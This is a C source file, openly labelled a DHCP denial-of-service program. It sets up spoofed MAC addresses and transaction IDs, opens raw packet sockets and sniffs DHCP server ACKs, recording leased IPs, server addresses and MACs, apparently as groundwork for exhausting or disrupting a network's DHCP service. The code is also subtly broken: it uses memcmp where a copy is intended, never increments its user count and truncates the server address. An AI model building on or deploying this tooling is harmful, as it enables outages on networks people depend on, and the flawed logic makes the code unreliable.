/*
dcmp denial_of_service program.
march 2019
by wang zih_min

*/
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <sys/ioctl.h>
#include "construct_packet.h"
#include <asm/types.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <pthread.h>
#include <time.h>

char interface[IFNAMSIZ]={0};
#define ARPHRD_ETHER 1
#define USERMAX 1000
struct netlink_msg{
	struct nlmsghdr  nh;
	struct ifinfomsg itf;
	char attrbuf[512];
};
struct dhcp_lease_info{
};
struct mac_address{
	unsigned char hwmac[6];
};

typedef struct user{
	unsigned int ip;
	unsigned int server_ip;
	unsigned char hwmac[6];
}User;

void send_fd(char *s){
	write(STDOUT_FILENO, s, strlen(s));
}
// struct dhcp_lease_info *dhcp_protocol(int sd,unsigned char*hwmac,unsigned int a_ip, struct ifreq itface,unsigned int type, unsigned int*server_ip);
struct dhcp_lease_info *dhcp_protocol(int sd,unsigned int xid, unsigned char*hwmac,unsigned char *dstmac, unsigned int *scrip, unsigned int *dstip, struct ifreq itface,unsigned char* fixed_mac, unsigned int type);
int strncmp_with_null(unsigned char* s1,unsigned char *s2,int number);
void *initiate_interface(void*arg);
void process_msg(unsigned char *packet_in, int recv_msg_len, Packet *p);
int record_user(unsigned int ip, unsigned int server_ip, unsigned char *hw_addr);

User users[USERMAX];
int user_num = 0;

int main(int argc,char **argv){

	if(argc!=4){
		fprintf(stderr,"usage: <dhcp_dos> <name of a connected interface> <i (hwmac + i)> <xid>\n");
		exit(-1);
	}

	if(strlen(argv[1])>=IFNAMSIZ){
		fprintf(stderr,"interface name too long\n");
		exit(-1);
	}

	//Copy interface name to a global variable.
	memcpy(interface,argv[1],IFNAMSIZ);


	// set mac and xid
	// unsigned char *hwmac = argv[2];
	unsigned int xid = atoi(argv[3]);

	unsigned char hwmac[6]={0x80,0xa5,0x89,0xa2,0xc5,0xff};
	//unsigned int xid = 12346;
	
	int last = 5;
	for(int i = 0; i < atoi(argv[2]) ; i++)
	{
		while(hwmac[last] == 0xff)
		{
			last -=1 ;
		}
		xid++;
		hwmac[last] += 0x01;
	}
	

	int sd;
	// fprintf(stdout,"htons(ETH_P_IP) = %d\n", htons(ETH_P_IP));
	// fprintf(stdout,"%d\n", IPPROTO_RAW);
	if((sd=socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW))<0){
		perror("socket()");
		exit(-1);
	}

	// fprintf(stdout,"sd %d\n",sd);

	// get mac address
	struct ifreq itface;
	memset(&itface,0,sizeof(struct ifreq));
	
	strncpy(itface.ifr_name,interface,strlen(interface));

	// strncpy(itface.ifr_name,"ens38",IFNAMSIZ);
	if(ioctl(sd,SIOCGIFHWADDR, &itface) < 0){
		perror("ioctl(SIOCGIFHWADDR)");	
		exit(-1);
	}
	//check whether it is ethernet interface
	if(itface.ifr_hwaddr.sa_family!=ARPHRD_ETHER){
		fprintf(stderr, "interface: %s\n", argv[1]);
		fprintf(stderr,"interface provided is not a ethernet interface\n");
		exit(-1);

	}

	unsigned char fixed_mac[6];
	memcpy(fixed_mac, itface.ifr_hwaddr.sa_data, 6);
	
	if(ioctl(sd, SIOCGIFINDEX, &itface) < 0){
		perror("ioctl(SIOCGIFINDEX)");
		exit(-1);

	}
	
	//Bind our file descriptor to this interface.
	struct sockaddr_ll ifaddr;
	ifaddr.sll_family=AF_PACKET;
	ifaddr.sll_ifindex=itface.ifr_ifindex;
	ifaddr.sll_protocol=htons(ETH_P_IP);

	int recv_sd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
	if(recv_sd < 0){
		perror("recv socket()");
		exit(0);
	}

	struct timeval tv;
	tv.tv_sec = 0;
	tv.tv_usec = 0;
	fd_set readfds;



	while(1){
		FD_ZERO(&readfds);
		// should need to add STDIN to get parent input
		FD_SET(recv_sd, &readfds);

		// printf("select\n");
		if(select(recv_sd+1, &readfds, NULL, NULL, &tv)<0){
			perror("select()");
			exit(-1);
		};

		if(FD_ISSET(recv_sd, &readfds)){

			unsigned char packet_in[PACKETMAXSIZE] = {};
			Packet *p = (Packet *)packet_in;
			int recv_msg_len=recvfrom(recv_sd,packet_in,PACKETMAXSIZE,0,NULL,NULL);

			if(memcmp(p -> udp.srcPort, "\x00\x43", 2) != 0) continue;

			struct dhcp_header *dhcp;
			dhcp = (struct dhcp_header*)&(p -> data);

			if(dhcp -> op != 2) continue;
			int isACK = 1;
			for(int offset = 4/* skip magic cookie*/;isACK;){
				unsigned char option = dhcp -> exten[offset];
				if(option == 0xff) break;
				offset ++;
				int len = dhcp -> exten[offset];
				offset ++;
				switch(option){
					case 53: //message type
						if(dhcp -> exten[offset] != DHCP_ACK){
							// send_fd(inet_ntoa(*(struct in_addr *)&(dhcp -> your_ip)));
							// fprintf(stdout,"get ip: %s\n", inet_ntoa(*(struct in_addr *)&(dhcp -> your_ip)));
							isACK = 0;
						}else{
							printf("get ACK\n");
						}
						break;
					case 54:
						if(record_user(dhcp -> your_ip, dhcp -> exten[offset], dhcp -> hw_addr) < 0){
							perror("record_user");
							exit(0);
						}
						// dhcp_server_ip = (struct in_addr *)&(dhcp -> exten[offset]);
						// fprintf(stdout,"server ip : %s\n", inet_ntoa(*dhcp_server_ip));
						break;
					default:
						break;
				}
				offset += len;
			}
		}
	}
	return 0;
}

int record_user(unsigned int ip, unsigned int server_ip, unsigned char *hw_addr){

	printf("record %s\n", inet_ntoa(*(struct in_addr*)&ip));

	for(int i = 0; i < user_num; i++){
		if(users[i].ip == ip){
			users[i].server_ip = server_ip;
			memcpy(users[i].hwmac, hw_addr, 6);
			return 1;
		}
	}
	if(user_num < USERMAX){
		users[user_num].ip = ip;
		users[user_num].server_ip = server_ip;
		memcmp(users[user_num].hwmac, hw_addr, 6);
	}else{
		printf("User is full!");
	}
	return 1;
}

